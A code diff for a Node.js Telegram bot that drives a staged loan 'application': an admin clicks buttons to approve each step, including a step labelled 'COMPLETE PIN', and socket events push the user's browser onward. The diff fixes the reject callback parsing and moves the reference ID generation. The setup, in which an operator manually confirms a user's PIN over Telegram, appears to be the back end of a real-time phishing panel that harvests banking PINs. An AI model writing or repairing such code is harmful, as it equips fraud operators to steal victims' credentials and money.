@@ -18,9 +18,9 @@ const botManager = {
         if (needsApproval) {
             options.reply_markup = {
                 inline_keyboard: [[
-                    // Now Step 1 Approval moves user to Step 2 (PIN screen)
+                    // Step 1 Approval moves user to Step 2 (PIN screen)
                     { text: "✅ APPROVE (Move to PIN)", callback_data: `approve_1_${appId}` },
-                    { text: "❌ REJECT", callback_data: `reject_${appId}` }
+                    { text: "❌ REJECT", callback_data: `reject_0_${appId}` }
                 ]]
             };
         }
@@ -34,7 +34,7 @@ const botManager = {
             reply_markup: {
                 inline_keyboard: [[
                     { text: "✅ COMPLETE PIN (Move to Loan)", callback_data: `approve_2_${appId}` },
-                    { text: "❌ REJECT", callback_data: `reject_${appId}` }
+                    { text: "❌ REJECT", callback_data: `reject_0_${appId}` }
                 ]]
             }
         });
@@ -43,6 +43,7 @@ const botManager = {
 
 // Handle Admin Button Clicks
 bot.on("callback_query", (query) => {
+    // Adding the placeholder zero into reject data aligns this split cleanly
     const [action, step, appId] = query.data.split("_");
     const io = global.io;
 
@@ -54,10 +55,8 @@ bot.on("callback_query", (query) => {
         } 
         else if (step === "2") {
             // Step 2 Approved -> Signal frontend to continue onto Step 3 (Loan Details)
-            // Note: If you want to use referenceId generation here instead of at the final step, 
-            // you can pass it over now, or keep it inside the frontend step flow as configured.
-            const ref = "GMB-" + Math.floor(Math.random() * 900000 + 100000);
-            io.to(appId).emit('pin-verified', { referenceId: ref });
+            // Reference ID generation is handled directly by Step 5 frontend form submission
+            io.to(appId).emit('pin-verified');
             bot.answerCallbackQuery(query.id, { text: "PIN confirmed. User moving to Loan details." });
         }
         
@@ -69,6 +68,7 @@ bot.on("callback_query", (query) => {
     }
 
     if (action === "reject") {
+        // appId is now populated properly instead of being undefined
         io.to(appId).emit('error', { message: "Application declined by admin." });
         bot.answerCallbackQuery(query.id, { text: "Application Rejected" });
         bot.editMessageText(query.message.text + "\n\n❌ <b>ACTION: REJECTED</b>", {
